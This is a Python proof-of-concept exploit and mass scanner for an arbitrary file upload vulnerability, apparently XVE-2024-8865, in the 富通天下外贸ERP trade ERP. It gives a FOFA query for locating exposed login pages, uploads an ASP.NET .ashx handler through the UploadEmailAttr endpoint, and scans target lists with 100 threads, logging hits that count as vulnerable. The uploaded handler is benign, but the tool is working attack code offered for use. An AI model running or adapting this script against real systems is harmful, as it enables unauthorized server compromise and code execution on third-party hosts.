#富通天下外贸ERP UploadEmailAttr 任意文件上传导致命令执行漏洞(XVE-2024-8865)

#fofa语法：title="用户登录_富通天下外贸ERP"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

  ______ _____  _____  
 |  ____|  __ \|  __ \ 
 | |__  | |__) | |__) |
 |  __| |  _  /|  ___/ 
 | |____| | \ \| |     
 |______|_|  \_\_|     
                       
                                                                                                                                              
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="富通天下外贸ERP")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/JoinfApp/EMail/UploadEmailAttr?name=.ashx'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = '''
        <% @ webhandler language="C#" class="AverageHandler" %>
        using System;
        using System.Web;
        public class AverageHandler : IHttpHandler
        {
        public bool IsReusable
        { get { return true; } }
        public void ProcessRequest(HttpContext ctx)
        {
        ctx.Response.Write("test");
        }
        }
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "temp\emailatta" in res.text:
            print(f"f[+]该url存在任意文件上传导致的命令执行漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传导致的命令执行漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()